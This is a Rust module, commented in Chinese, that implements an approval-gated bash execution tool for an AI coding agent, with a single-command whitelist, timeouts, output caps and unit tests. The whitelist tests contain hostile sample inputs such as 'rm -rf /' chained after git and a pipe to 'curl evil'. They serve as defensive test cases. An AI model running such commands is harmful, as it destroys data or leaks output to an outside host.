//! # shell 工具（T290／FR-777／ADR-070：模型可执行命令）
//!
//! 工具本体与执行器抽象在本 crate；真正的进程执行由装配根注入
//! [`ShellExecutor`] 实现（本 crate 不依赖 `whcode-runtime`，分层不变）。
//! 治理三层全部复用既有基建：
//!
//! 1. **审批**：`SideEffectScope::ProcessSpawn` ＋ 交互装配的 per-tool `Ask` 种子
//!    （人看到完整命令文本再决定）；"持久允许"只对白名单命中的单命令生效
//!    （降级逻辑在 `whcode-app` 审批层，本 crate 只提供匹配纯函数）。
//! 2. **白名单**：bash 图灵完备，任意脚本的命令白名单不可判定（`;`／`&&`／`$()`
//!    可绕过首词匹配）——因此白名单**只约束免审批通道**：单命令（无控制结构）
//!    且首词命中才可能免审批，其余一切脚本每次都必须询问（ADR-070 决策 4）。
//! 3. **资源界**：超时（缺省 30 s、上限 600 s）、请求体积上限、输出尾部截断，
//!    全部由执行器实现承担（装配根适配 `whcode-runtime` 的受控执行）。
//!
//! 威胁模型（模型诱导执行／PATH 劫持／凭据外泄等 T1—T10 与残余风险）见
//! `docs/adr/ADR-070-shell-tool-threat-model.md`。

use std::path::PathBuf;
use std::sync::Arc;
use std::time::{Duration, Instant};

use serde_json::Value;
use whcode_domain::{ErrorCode, WhError};

use crate::registry::{
    DEFAULT_TOOL_TIMEOUT_MS, MAX_TOOL_TIMEOUT_MS, ParamType, SideEffectScope, Tool, ToolDescriptor,
    ToolOutput, ToolParameter, bound_output, validate_arguments,
};

/// 工具稳定名（审批 per-tool 种子与配置均引用此名）。
pub const SHELL_TOOL: &str = "shell";

/// 脚本文本上限（64 KiB）：bash 脚本远小于此即不可维护，超限显式拒绝。
pub const SHELL_MAX_SCRIPT_BYTES: usize = 64 * 1024;

/// 白名单条目上限（条数）：显式 opt-in 的免审批清单必须保持可读可审计。
pub const MAX_ALLOWED_COMMANDS: usize = 32;

/// 执行请求（由工具构造，执行器实现消费）。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ShellRequest {
    /// 脚本文本（argv 直传 `bash -c`，不经二次 shell 拼接）。
    pub script: String,
    /// 工作目录（工作区根；cwd 是锚点不是监狱，见 ADR-070 威胁模型 T6）。
    pub workdir: PathBuf,
    /// 超时（到期由执行器终止进程树）。
    pub timeout: Duration,
    /// 单流输出上限（字节；超出截断并标记，R-05）。
    pub max_output_bytes: usize,
}

/// 执行结果（退出码、有界输出尾部、显式标记与 FR-706 检查点要素）。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ShellOutcome {
    /// 退出码（超时终止时为 `None`——超时路径在工具层映射 `ToolTimeout` 错误）。
    pub exit_code: Option<i32>,
    /// stdout 尾部（已截断至上限）。
    pub stdout_tail: String,
    /// stderr 尾部（已截断至上限）。
    pub stderr_tail: String,
    /// stdout 是否发生截断（R-05：截断必须显式标记）。
    pub stdout_truncated: bool,
    /// stderr 是否发生截断。
    pub stderr_truncated: bool,
    /// 是否超时被终止（由执行器杀树；工具层据此映射 `ToolTimeout`）。
    pub timed_out: bool,
    /// 脚本哈希（FR-706 检查点：可复核"执行过什么"）。
    pub script_hash: String,
    /// 运行时指纹（FR-706 检查点：`gitbash/<bash 版本摘要>`）。
    pub runtime_fingerprint: String,
    /// 工作目录策略（FR-706 检查点：shell 工具恒为 `workspace`）。
    pub workdir_policy: String,
}

/// 执行器抽象：装配根提供实现（`whcode-bin` 适配 `GitBashProvider::execute_in`）。
pub trait ShellExecutor: Send + Sync {
    /// 执行一段脚本。实现必须：受控子进程（超时杀树）、有界输出、最小环境、
    /// 凭据剥离、进程组与窗口抑制——即 `whcode-runtime::worker` 的治理口径。
    ///
    /// # Errors
    ///
    /// bash 不可用、启动失败或执行器内部错误时返回归一化错误；脚本超时**不**在此
    /// 报错（返回 `timed_out = true` 的结果，由工具层映射 `ToolTimeout`）。
    fn execute(&self, request: ShellRequest) -> Result<ShellOutcome, WhError>;
}

/// shell 工具的治理束（装配根构造）：执行器 ＋ 免审批白名单。
pub struct ShellGovernance {
    /// 注入的执行器。
    pub executor: Arc<dyn ShellExecutor>,
    /// 免审批白名单（首词精确匹配；默认空＝一切脚本每次询问）。
    pub allowed_commands: Vec<String>,
}

impl ShellGovernance {
    /// 判定本次调用参数是否命中免审批白名单（供审批层降级规则使用）。
    #[must_use]
    pub fn allows(&self, arguments: &Value) -> bool {
        arguments
            .get("script")
            .and_then(Value::as_str)
            .is_some_and(|script| whitelist_allows(&self.allowed_commands, script))
    }
}

/// 白名单匹配（ADR-070 决策 4）：仅当脚本是**单命令**（不含任何 shell 控制结构）
/// 且首词精确命中白名单时返回 `true`。复合脚本恒为 `false`——首词匹配对图灵完备
/// 的脚本不可判定，白名单不提供"阻止执行"的承诺（那是审批与沙箱的职责）。
#[must_use]
pub fn whitelist_allows(allowed: &[String], script: &str) -> bool {
    let Some(first) = single_command_first_word(script) else {
        return false;
    };
    allowed.iter().any(|entry| entry == first)
}

/// 提取"单命令"的首词；含控制结构（`;`、管道、重定向、命令替换、括号、换行）时
/// 返回 `None`——这些字符使"首词"失去命令身份意义。
fn single_command_first_word(script: &str) -> Option<&str> {
    if script.chars().any(|c| {
        matches!(
            c,
            ';' | '|' | '&' | '$' | '`' | '\n' | '\r' | '>' | '<' | '(' | ')'
        )
    }) {
        return None;
    }
    let trimmed = script.trim();
    if trimmed.is_empty() {
        return None;
    }
    trimmed.split_whitespace().next()
}

/// shell 工具（bash 脚本执行；治理束注入）。
pub struct Shell {
    governance: Arc<ShellGovernance>,
}

impl Shell {
    /// 由治理束构造（装配根调用；`whcode-app` 经 `registry_with_shell` 注册）。
    #[must_use]
    pub fn new(governance: Arc<ShellGovernance>) -> Self {
        Self { governance }
    }

    /// 解析并钳制超时参数：缺省 [`DEFAULT_TOOL_TIMEOUT_MS`]，上限
    /// [`MAX_TOOL_TIMEOUT_MS`]（越界收口不拒绝）。
    fn timeout_from(arguments: &Value) -> Result<Duration, WhError> {
        let requested = match arguments.get("timeout_ms") {
            None | Some(Value::Null) => DEFAULT_TOOL_TIMEOUT_MS,
            Some(value) => value.as_u64().ok_or_else(|| {
                WhError::invalid_state("参数 timeout_ms 必须为非负整数（毫秒）".to_string())
            })?,
        };
        Ok(Duration::from_millis(requested.min(MAX_TOOL_TIMEOUT_MS)))
    }

    fn run(
        &self,
        workspace: &std::path::Path,
        arguments: &Value,
        deadline: Option<Instant>,
    ) -> Result<ToolOutput, WhError> {
        let descriptor = Tool::descriptor(self);
        validate_arguments(&descriptor, arguments)?;
        let script = arguments
            .get("script")
            .and_then(Value::as_str)
            .ok_or_else(|| WhError::invalid_state("参数 script 必须为字符串".to_string()))?;
        if script.len() > SHELL_MAX_SCRIPT_BYTES {
            return Err(WhError::invalid_state(format!(
                "脚本体量 {len} 字节超上限 {SHELL_MAX_SCRIPT_BYTES}（R-05 有界：拒绝而非截断）",
                len = script.len()
            )));
        }
        let timeout = Self::timeout_from(arguments)?;
        // deadline（T267/FR-757）与脚本超时取较小者：到期由执行器杀树并映射
        // `ToolTimeout`（"停止等待并标记"成为可判定事实）。
        let timeout = match deadline {
            None => timeout,
            Some(deadline) => {
                let remaining = deadline.saturating_duration_since(Instant::now());
                if remaining.is_zero() {
                    return Err(WhError::new(
                        ErrorCode::ToolTimeout,
                        "脚本执行截止时间已过（未启动子进程）".to_string(),
                    ));
                }
                timeout.min(remaining)
            }
        };
        let outcome = self.governance.executor.execute(ShellRequest {
            script: script.to_string(),
            workdir: workspace.to_path_buf(),
            timeout,
            max_output_bytes: crate::MAX_TOOL_OUTPUT_BYTES,
        })?;
        if outcome.timed_out {
            return Err(WhError::new(
                ErrorCode::ToolTimeout,
                format!(
                    "脚本超时被终止（进程树已回收）；stderr 尾部：{}",
                    outcome.stderr_tail
                ),
            ));
        }
        let exit = outcome
            .exit_code
            .map_or_else(|| "无（被终止）".to_string(), |code| code.to_string());
        let content = format!(
            "退出码：{exit}\n脚本哈希：{hash}\n运行时：{fp}（workdir_policy={policy}）\n\
             [stdout{stdout_mark}]\n{stdout}\n[stderr{stderr_mark}]\n{stderr}",
            hash = outcome.script_hash,
            fp = outcome.runtime_fingerprint,
            policy = outcome.workdir_policy,
            stdout_mark = if outcome.stdout_truncated {
                "（已截断）"
            } else {
                ""
            },
            stdout = outcome.stdout_tail,
            stderr_mark = if outcome.stderr_truncated {
                "（已截断）"
            } else {
                ""
            },
            stderr = outcome.stderr_tail,
        );
        // 截断标记取并集：worker 层流截断（R-05）或正文超 64 KiB 上限（bound_output）。
        let bounded = bound_output(content);
        Ok(ToolOutput::text(
            bounded.content,
            bounded.truncated || outcome.stdout_truncated || outcome.stderr_truncated,
        ))
    }
}

impl Tool for Shell {
    fn descriptor(&self) -> ToolDescriptor {
        ToolDescriptor {
            name: SHELL_TOOL,
            description: "在工作区根目录以 bash 执行一段脚本文本；每次调用须经审批（持久允许\
              仅对白名单命中的单命令生效），超时与输出有界；脚本副作用不进前像恢复\
              （ADR-068 决策 7）",
            parameters: vec![
                ToolParameter {
                    name: "script",
                    kind: ParamType::String,
                    required: true,
                    description: "完整 bash 脚本文本（argv 直传 `bash -c`，不经二次拼接）",
                },
                ToolParameter {
                    name: "timeout_ms",
                    kind: ParamType::Integer,
                    required: false,
                    description: "超时毫秒；缺省 30000，上限 600000",
                },
            ],
            side_effect_scope: SideEffectScope::ProcessSpawn,
            timeout_ms: Some(MAX_TOOL_TIMEOUT_MS),
            output_schema: None,
        }
    }

    fn execute(
        &self,
        workspace: &std::path::Path,
        arguments: &Value,
    ) -> Result<ToolOutput, WhError> {
        self.run(workspace, arguments, None)
    }

    fn execute_with_deadline(
        &self,
        workspace: &std::path::Path,
        arguments: &Value,
        deadline: Option<Instant>,
    ) -> Result<ToolOutput, WhError> {
        self.run(workspace, arguments, deadline)
    }
}

#[cfg(test)]
pub mod tests_support {
    //! 测试支撑（同 crate 测试共用）：恒成功、无输出的空执行器。

    use super::*;

    /// 恒成功空执行器（注册表装配测试等无需真实进程的场合）。
    #[derive(Debug, Default)]
    pub struct NullExecutor;

    impl ShellExecutor for NullExecutor {
        fn execute(&self, _request: ShellRequest) -> Result<ShellOutcome, WhError> {
            Ok(ShellOutcome {
                exit_code: Some(0),
                stdout_tail: String::new(),
                stderr_tail: String::new(),
                stdout_truncated: false,
                stderr_truncated: false,
                timed_out: false,
                script_hash: "fnv64:null".to_string(),
                runtime_fingerprint: "gitbash/test".to_string(),
                workdir_policy: "workspace".to_string(),
            })
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Mutex;

    fn json_args(raw: &str) -> Value {
        serde_json::from_str(raw).expect("测试参数 JSON")
    }

    /// 记录请求的桩执行器（成功路径返回固定结果；可编排超时）。
    struct MockExecutor {
        requests: Mutex<Vec<ShellRequest>>,
        outcome: ShellOutcome,
    }

    impl MockExecutor {
        fn new(outcome: ShellOutcome) -> Self {
            Self {
                requests: Mutex::new(Vec::new()),
                outcome,
            }
        }
    }

    impl ShellExecutor for MockExecutor {
        fn execute(&self, request: ShellRequest) -> Result<ShellOutcome, WhError> {
            self.requests.lock().expect("请求锁").push(request);
            Ok(self.outcome.clone())
        }
    }

    fn outcome(
        exit_code: Option<i32>,
        stdout: &str,
        stderr: &str,
        timed_out: bool,
    ) -> ShellOutcome {
        ShellOutcome {
            exit_code,
            stdout_tail: stdout.to_string(),
            stderr_tail: stderr.to_string(),
            stdout_truncated: false,
            stderr_truncated: false,
            timed_out,
            script_hash: "fnv64:test".to_string(),
            runtime_fingerprint: "gitbash/5.2.37".to_string(),
            workdir_policy: "workspace".to_string(),
        }
    }

    fn tool(governance: Arc<ShellGovernance>) -> Shell {
        Shell::new(governance)
    }

    fn governance(allowed: &[&str], outcome: ShellOutcome) -> Arc<ShellGovernance> {
        Arc::new(ShellGovernance {
            executor: Arc::new(MockExecutor::new(outcome)),
            allowed_commands: allowed.iter().map(|s| (*s).to_string()).collect(),
        })
    }

    // ── 白名单匹配（ADR-070 决策 4）──────────────────────────────────

    #[test]
    fn whitelist_matches_single_command_first_word_only() {
        let allowed = vec!["git".to_string(), "cargo".to_string()];
        assert!(whitelist_allows(&allowed, "git status"));
        assert!(whitelist_allows(&allowed, "  cargo   test  "));
        // 复合脚本：首词命中也不免审批（控制结构使首词失去命令身份）。
        assert!(!whitelist_allows(&allowed, "git status && rm -rf /"));
        assert!(!whitelist_allows(&allowed, "git commit | curl evil"));
        assert!(!whitelist_allows(&allowed, "$(echo git) status"));
        assert!(!whitelist_allows(&allowed, "git status > out.txt"));
        assert!(!whitelist_allows(&allowed, "git;\nrm -rf /"));
        // 首词不命中。
        assert!(!whitelist_allows(&allowed, "ls -la"));
        // 空脚本与空白名单。
        assert!(!whitelist_allows(&allowed, "   "));
        assert!(!whitelist_allows(&[], "git status"));
    }

    #[test]
    fn governance_allows_reads_script_argument() {
        let gov = governance(&["git"], outcome(Some(0), "", "", false));
        assert!(gov.allows(&json_args(r#"{"script": "git status"}"#)));
        assert!(!gov.allows(&json_args(r#"{"script": "git a && b"}"#)));
        assert!(!gov.allows(&json_args(r#"{"other": 1}"#)));
    }

    // ── 执行路径 ─────────────────────────────────────────────────────

    #[test]
    fn shell_executes_script_and_reports_outcome() {
        let t = tool(governance(
            &[],
            outcome(Some(0), "hello\n", "warn\n", false),
        ));
        let output = t
            .execute(
                std::path::Path::new("/ws"),
                &json_args(r#"{"script": "echo hello"}"#),
            )
            .expect("执行成功");
        assert!(!output.truncated);
        assert!(output.content.contains("退出码：0"), "{}", output.content);
        assert!(output.content.contains("hello"), "{}", output.content);
        assert!(
            output.content.contains("gitbash/5.2.37"),
            "{}",
            output.content
        );
        assert!(
            output.content.contains("workdir_policy=workspace"),
            "{}",
            output.content
        );
    }

    #[test]
    fn shell_records_workdir_timeout_and_output_caps() {
        let executor = Arc::new(MockRecorder::default());
        let gov = Arc::new(ShellGovernance {
            executor: executor.clone() as Arc<dyn ShellExecutor>,
            allowed_commands: Vec::new(),
        });
        let t = Shell::new(gov);
        t.execute(
            std::path::Path::new("/ws"),
            &json_args(r#"{"script": "echo hi", "timeout_ms": 999999999}"#),
        )
        .expect("执行成功");
        let request = executor.last();
        assert_eq!(request.workdir, PathBuf::from("/ws"));
        // 越界按上限收口（999999999 → 600000）。
        assert_eq!(request.timeout, Duration::from_millis(MAX_TOOL_TIMEOUT_MS));
        assert_eq!(request.max_output_bytes, crate::MAX_TOOL_OUTPUT_BYTES);
        // 缺省超时：不带 timeout_ms 的调用记录 30 s。
        t.execute(
            std::path::Path::new("/ws"),
            &json_args(r#"{"script": "echo hi"}"#),
        )
        .expect("执行成功");
        assert_eq!(
            executor.last().timeout,
            Duration::from_millis(DEFAULT_TOOL_TIMEOUT_MS)
        );
    }

    #[test]
    fn shell_maps_timeout_to_tool_timeout_error() {
        let t = tool(governance(&[], outcome(None, "", "partial", true)));
        let err = t
            .execute(
                std::path::Path::new("/ws"),
                &json_args(r#"{"script": "sleep 999"}"#),
            )
            .expect_err("超时必须报错");
        assert_eq!(err.code, ErrorCode::ToolTimeout);
        assert!(err.message.contains("超时"), "{}", err.message);
    }

    #[test]
    fn shell_rejects_oversized_script_and_bad_timeout() {
        let t = tool(governance(&[], outcome(Some(0), "", "", false)));
        let big = "x".repeat(SHELL_MAX_SCRIPT_BYTES + 1);
        let err = t
            .execute(
                std::path::Path::new("/ws"),
                &json_args(&format!(r#"{{"script": "{big}"}}"#)),
            )
            .expect_err("超限脚本必须拒绝");
        assert_eq!(err.code, ErrorCode::InvalidState);
        let err = t
            .execute(
                std::path::Path::new("/ws"),
                &json_args(r#"{"script": "ls", "timeout_ms": -5}"#),
            )
            .expect_err("负数超时必须拒绝");
        assert_eq!(err.code, ErrorCode::InvalidState);
    }

    #[test]
    fn shell_deadline_in_past_fails_without_spawning() {
        let executor = Arc::new(MockRecorder::default());
        let gov = Arc::new(ShellGovernance {
            executor: executor.clone() as Arc<dyn ShellExecutor>,
            allowed_commands: Vec::new(),
        });
        let t = Shell::new(gov);
        let past = Instant::now() - Duration::from_secs(1);
        let err = t
            .execute_with_deadline(
                std::path::Path::new("/ws"),
                &json_args(r#"{"script": "ls"}"#),
                Some(past),
            )
            .expect_err("截止已过必须报错");
        assert_eq!(err.code, ErrorCode::ToolTimeout);
        assert!(executor.requests().is_empty(), "不得启动子进程");
    }

    #[test]
    fn shell_deadline_caps_requested_timeout() {
        let executor = Arc::new(MockRecorder::default());
        let gov = Arc::new(ShellGovernance {
            executor: executor.clone() as Arc<dyn ShellExecutor>,
            allowed_commands: Vec::new(),
        });
        let t = Shell::new(gov);
        // deadline 余量 2 s < 请求 30 s：实际超时取较小者。
        let deadline = Instant::now() + Duration::from_secs(2);
        t.execute_with_deadline(
            std::path::Path::new("/ws"),
            &json_args(r#"{"script": "ls"}"#),
            Some(deadline),
        )
        .expect("执行成功");
        let recorded = executor.last().timeout;
        assert!(recorded <= Duration::from_secs(2), "{recorded:?}");
    }

    /// 只记录请求、返回固定成功的桩（请求历史可查）。
    #[derive(Default)]
    struct MockRecorder {
        requests: Mutex<Vec<ShellRequest>>,
    }

    impl MockRecorder {
        fn last(&self) -> ShellRequest {
            self.requests
                .lock()
                .expect("请求锁")
                .last()
                .cloned()
                .expect("已记录请求")
        }

        fn requests(&self) -> Vec<ShellRequest> {
            self.requests.lock().expect("请求锁").clone()
        }
    }

    impl ShellExecutor for MockRecorder {
        fn execute(&self, request: ShellRequest) -> Result<ShellOutcome, WhError> {
            self.requests.lock().expect("请求锁").push(request);
            Ok(outcome(Some(0), "", "", false))
        }
    }

    #[test]
    fn descriptor_declares_process_spawn_scope_and_budget() {
        let t = tool(governance(&[], outcome(Some(0), "", "", false)));
        let descriptor = Tool::descriptor(&t);
        assert_eq!(descriptor.name, SHELL_TOOL);
        assert_eq!(descriptor.side_effect_scope, SideEffectScope::ProcessSpawn);
        assert_eq!(descriptor.timeout_ms, Some(MAX_TOOL_TIMEOUT_MS));
        assert!(descriptor.output_schema.is_none());
    }

    #[test]
    fn shell_output_marks_truncation_explicitly() {
        let mut outcome = outcome(Some(0), "out", "", false);
        outcome.stdout_truncated = true;
        let t = tool(governance(&[], outcome));
        let output = t
            .execute(
                std::path::Path::new("/ws"),
                &json_args(r#"{"script": "ls"}"#),
            )
            .expect("执行成功");
        assert!(output.truncated, "R-05：截断必须显式标记");
        assert!(
            output.content.contains("[stdout（已截断）]"),
            "{}",
            output.content
        );
    }
}
